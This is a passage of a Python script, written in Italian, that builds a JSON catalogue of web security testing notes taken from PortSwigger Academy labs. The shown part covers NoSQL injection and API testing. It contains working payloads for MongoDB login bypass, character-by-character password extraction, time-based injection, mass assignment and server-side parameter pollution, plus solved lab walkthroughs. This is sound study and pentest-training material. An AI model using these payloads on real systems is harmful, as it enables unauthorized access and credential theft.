        "diversi. Due tipi di injection: Syntax Injection (si altera la sintassi della query) "
        "e Operator Injection (si iniettano operatori come $ne, $in, $regex, $where).\n\n"
        "Prevenzione: validare con allowlist di caratteri; query parametrizzate; per gli "
        "operatori, allowlist delle chiavi consentite."
    ),
    references=PS + "/nosql-injection",
    children=[
        micro("Syntax Injection", "Rompere e riscrivere la sintassi della query.", [
            test("Fuzzing e carattere interpretato",
                 goal="Capire se l'input altera la query.",
                 payload="'\"`{\n;$Foo}\n$Foo \\xYZ\n-- singolo carattere:\n'",
                 process="Invia una fuzz string (URL-encoded o come stringa JSON) e cerca errori/cambiamenti. Poi invia solo ' e verifica se rompe la sintassi; conferma con l'escape '\\''."),
            test("Condizioni booleane",
                 goal="Verificare di poter influenzare la logica.",
                 payload="' && 0 && 'x\n' && 1 && 'x",
                 process="Invia una condizione sempre falsa e una sempre vera: se le risposte differiscono, l'injection influenza la query."),
            test("Sovrascrivere le condizioni",
                 goal="Restituire piu' dati del previsto.",
                 payload="'||'1'=='1\n-- null byte per troncare condizioni successive:\nfizzy'%00",
                 process="Inietta una condizione sempre vera (||'1'=='1) per far restituire tutto. Un null byte (%00) puo' far ignorare a MongoDB le condizioni successive (es. this.released == 1). Attenzione: una condizione sempre-vera riusata in UPDATE/DELETE puo' modificare/cancellare dati."),
            lab("Lab: boolean + bypass di 'released'",
                process="Lab risolto: ' nel parametro category da' errore JS; con Gifts' && 0 && 'x (falso) nessun prodotto, Gifts' && 1 && 'x (vero) i Gifts, infine Gifts'||1||' mostra anche i prodotti non rilasciati."),
        ]),
        micro("Operator Injection", "Iniettare operatori di query ($ne, $in, $regex).", [
            test("Inserire operatori",
                 goal="Trasformare un valore in un operatore.",
                 payload="JSON:  {\"username\":{\"$ne\":\"invalid\"}}\nURL:   username[$ne]=invalid",
                 process="In JSON usa oggetti annidati; in URL la notazione [$op]. Se non va: converti GET->POST, Content-Type: application/json, corpo JSON (estensione Content Type Converter)."),
            test("Bypass dell'autenticazione",
                 goal="Loggarsi senza credenziali valide.",
                 payload="{\"username\":{\"$ne\":\"invalid\"},\"password\":{\"$ne\":\"invalid\"}}\n{\"username\":{\"$in\":[\"admin\",\"administrator\",\"superadmin\"]},\"password\":{\"$ne\":\"\"}}",
                 process="$ne su username e password seleziona il primo utente della collezione; $in mira a username noti/ipotizzati."),
            lab("Lab: login bypass con $ne / $regex",
                process="Lab risolto: username {\"$ne\":\"\"} logga; {\"$regex\":\"wien.*\"} funziona; con password {\"$ne\":\"\"} e username {\"$regex\":\"admin.*\"} si entra come admin."),
        ]),
        micro("Estrarre dati con $where (JavaScript)",
              "Quando la query usa operatori che eseguono JS.", [
            test("Esfiltrazione carattere per carattere",
                 goal="Ricostruire un valore (es. password) con condizioni booleane JS.",
                 payload="admin' && this.password[0] == 'a' || 'a'=='b\nadmin' && this.password.match(/\\d/) || 'a'=='b\n-- lunghezza:\nadministrator' && this.password.length < 30 || 'a'=='b",
                 process="Con $where puoi iniettare JS: testa un carattere alla volta (o match() per classi di caratteri), e la lunghezza con password.length < N."),
            test("Identificare i nomi dei campi",
                 goal="Scoprire quali campi esistono.",
                 payload="admin' && this.username!='\nadmin' && this.foo!='",
                 process="Confronta un campo noto (username) con uno sospetto (password) e uno inesistente (foo): se password si comporta come username, esiste. Dictionary attack per molti nomi."),
            lab("Lab: ricavare la password dell'admin",
                process="Lab risolto: verifichi l'injection (' da' errore, wiener' && '1'=='1 vero), trovi lunghezza 8 (length < 9 vero, < 8 falso), poi con Intruder Cluster bomb su administrator' && this.password[§0§]=='§a§ ricavi la password."),
        ]),
        micro("Estrarre dati con operatori",
              "Quando non c'e' JS: iniettare $where, keys(), $regex, tempi.", [
            test("Iniettare $where e leggere i nomi dei campi",
                 goal="Abilitare l'esecuzione JS e scoprire i campi.",
                 payload="{\"username\":\"wiener\",\"password\":\"peter\",\"$where\":\"0\"}\n{...,\"$where\":\"1\"}\n\"$where\":\"Object.keys(this)[0].match('^.{0}a.*')\"",
                 process="Aggiungi $where con 0/1: se le risposte differiscono, il JS viene eseguito. Poi con keys() ricostruisci i nomi dei campi un carattere alla volta."),
            test("Esfiltrazione con $regex",
                 goal="Estrarre dati senza JS.",
                 payload="{\"username\":\"admin\",\"password\":{\"$regex\":\"^a.*\"}}",
                 process="Verifica $regex (^.*), poi estrai carattere per carattere con ^a.*, ^ab.*, ..."),
            test("Injection basata sui tempi",
                 goal="Rilevare/sfruttare quando non c'e' differenza in risposta.",
                 payload="{\"$where\":\"sleep(5000)\"}\nadmin'+function(x){if(x.password[0]===\"a\"){sleep(5000)};}(this)+'",
                 process="Stabilisci un tempo di riferimento, poi inietta un ritardo condizionato: se la risposta e' piu' lenta, la condizione e' vera."),
        ]),
    ],
)


# ===========================================================================
#  13. API TESTING
# ===========================================================================
API_TESTING = macro(
    "API Testing",
    "Mappare e attaccare le API: endpoint, metodi, mass assignment, parameter pollution.",
    (
        "Le API fanno comunicare i sistemi; le loro vulnerabilita' colpiscono riservatezza, "
        "integrita' e disponibilita'. Si parte dalla ricognizione (endpoint, documentazione) e "
        "si prosegue provando metodi, content-type, parametri ed endpoint nascosti.\n\n"
        "Prevenzione: proteggere/aggiornare la documentazione, allowlist dei metodi, verificare "
        "il Content-Type, errori generici, protezioni su tutte le versioni; per il mass "
        "assignment, allowlist delle proprieta' aggiornabili."
    ),
    references=PS + "/api-testing",
    children=[
        micro("Ricognizione delle API", "Trovare endpoint e documentazione.", [
            test("Identificare gli endpoint",
                 goal="Mappare la superficie dell'API.",
                 payload="GET /api/books\n/api/books/mystery",
                 process="Individua i percorsi delle risorse. Cerca pattern /api/ e riferimenti negli script JS (BApp JS Link Finder)."),
            test("Trovare la documentazione",
                 goal="Ottenere la lista degli endpoint e come usarli.",
                 payload="/api   /swagger/index.html   /openapi.json",
                 process="Cerca gli endpoint di documentazione; se trovi /api/swagger/v1/users/123 esamina anche /api/swagger/v1, /api/swagger, /api. Analizza OpenAPI/JSON/YAML con Burp Scanner o OpenAPI Parser (o Postman/SoapUI)."),
            lab("Lab: documentazione su /api",
                process="Lab risolto loggando con wiener e aprendo /api (documentazione esposta)."),
        ]),
        micro("Interazione con gli endpoint", "Metodi HTTP e tipi di contenuto.", [
            test("Metodi HTTP supportati",
                 goal="Scoprire funzioni aggiuntive di un endpoint.",
                 payload="OPTIONS /api/products/1/price\n-- poi prova GET/POST/PUT/PATCH/DELETE",
                 process="OPTIONS rivela i metodi ammessi; prova tutti i verbi (lista integrata di Intruder)."),
            test("Tipi di contenuto supportati",
                 goal="Provocare errori o aggirare difese cambiando formato.",
                 payload="Content-Type: application/json\n{\"price\":0}",
                 process="Cambia Content-Type e riformatta il body (BApp Content Type Converter XML<->JSON)."),
            lab("Lab: PATCH del prezzo",
                process="Lab risolto: OPTIONS su /api/products/1/price mostra GET/PATCH; da loggato, PATCH con Content-Type application/json e {\"price\":0} azzera il prezzo della giacca."),
        ]),
        micro("Endpoint e parametri nascosti", "Scoprire cio' che non e' documentato.", [
            test("Endpoint nascosti",
                 goal="Trovare funzioni non documentate.",
                 payload="PUT /api/user/§update§   (payload: delete, add, ...)",
                 process="Con Intruder sostituisci la parte finale del path con funzioni comuni, usando wordlist di convenzioni API."),
            test("Parametri nascosti",
                 goal="Trovare parametri non documentati.",
                 process="Usa Intruder, BApp Param Miner (fino a 65.536 nomi per richiesta) o Content Discovery."),
        ]),
        micro("Mass Assignment",
              "Parametri interni associati automaticamente dai framework.", [
            test("Individuare e sfruttare campi nascosti",
                 goal="Impostare un campo sensibile (es. isAdmin).",
                 payload="GET mostra: {\"id\":123,\"isAdmin\":\"false\"}\nPATCH: {\"username\":\"wiener\",\"isAdmin\":true}",
                 process="Confronta i campi restituiti dalla GET con quelli accettati dalla PATCH: aggiungi il campo sensibile (prima con un valore non valido per capire se e' elaborato, poi con il valore voluto)."),
            lab("Lab: chosen_discount",
                process="Lab risolto: la risposta GET /api/checkout contiene chosen_discount, assente nella POST. Aggiungendolo alla POST ({\"chosen_discount\":{\"percentage\":100},...}) l'ordine passa."),
        ]),
        micro("Server-side Parameter Pollution (query string)",
              "Iniettare parametri nella richiesta lato server verso un'API interna.", [
            test("Troncare, iniettare, sovrascrivere",
                 goal="Manipolare la query inviata all'API interna.",
                 payload="name=peter%23foo         (# tronca: rimuove publicProfile=true)\nname=peter%26foo=xyz     (& aggiunge un parametro)\nname=peter%26name=carlos (sovrascrive: PHP usa l'ultimo, Express il primo, ASP.NET li unisce)",
                 process="Inserisci #, & ed = (URL-encoded) e osserva la risposta: puoi troncare condizioni (publicProfile), aggiungere o sovrascrivere parametri."),
            lab("Lab: SSPP -> reset token (query string)",
                process="Lab risolto sul /forgot-password: con %26field=x%23 scopri un parametro 'field'; brute-force (wordlist Server-side variable names) trova email e reset_token; username=administrator%26field=reset_token%23 restituisce il token di reset dell'admin."),
        ]),
        micro("Server-side Parameter Pollution (REST e formati)",
              "Nei percorsi REST e nei dati strutturati.", [
            test("Percorsi REST (path traversal)",
                 goal="Alterare i parametri inseriti nel path lato server.",
                 payload="name=peter%2f..%2fadmin   ->   /api/private/users/peter/../admin",
                 process="Se il valore finisce nel path di una richiesta interna, usa sequenze ../ per cambiare risorsa; # e ? aiutano a capire la struttura e a troncare."),
            test("Formati strutturati (JSON/XML)",
                 goal="Iniettare proprieta' nei dati strutturati lato server.",
                 payload="name=peter\",\"access_level\":\"administrator",
                 process="Se il tuo input finisce in un JSON/XML lato server senza encoding, chiudi il valore e aggiungi una proprieta' (es. access_level). Vale anche nelle risposte."),
            lab("Lab: SSPP nel path REST",
                process="Lab risolto sul /forgot-password: con # e ? capisci che l'input va nel path; con ../../../../openapi.json%23 leggi la definizione /api/internal/v1/users/{username}/field/{field}; poi username=../../v1/users/administrator/field/passwordResetToken%23 restituisce il token di reset."),
        ]),
    ],
)


# Tutte le macrocategorie, nell'ordine degli appunti.
MACROS = [
    SQL_INJECTION,
    AUTHENTICATION,
    PATH_TRAVERSAL,
    OS_COMMAND_INJECTION,
    BUSINESS_LOGIC,
    INFORMATION_DISCLOSURE,
    ACCESS_CONTROL,
    FILE_UPLOAD,
    RACE_CONDITIONS,
    SSRF,
    XXE,
    NOSQL_INJECTION,
    API_TESTING,
]


def main():
    out = Path(__file__).resolve().parent.parent / "data" / "web_seed.json"
    out.parent.mkdir(parents=True, exist_ok=True)
    out.write_text(
        json.dumps({"source": "appunti PortSwigger Academy", "topics": MACROS},
                   ensure_ascii=False, indent=2),
        encoding="utf-8",
    )
    nmicro = sum(len(m["children"]) for m in MACROS)
    ntest = sum(len(mi["checks"]) for m in MACROS for mi in m["children"]) \
        + sum(len(m["checks"]) for m in MACROS)
    print(f"Scritte {len(MACROS)} macrocategorie, {nmicro} microcategorie, {ntest} test/lab in {out}")


if __name__ == "__main__":
    main()
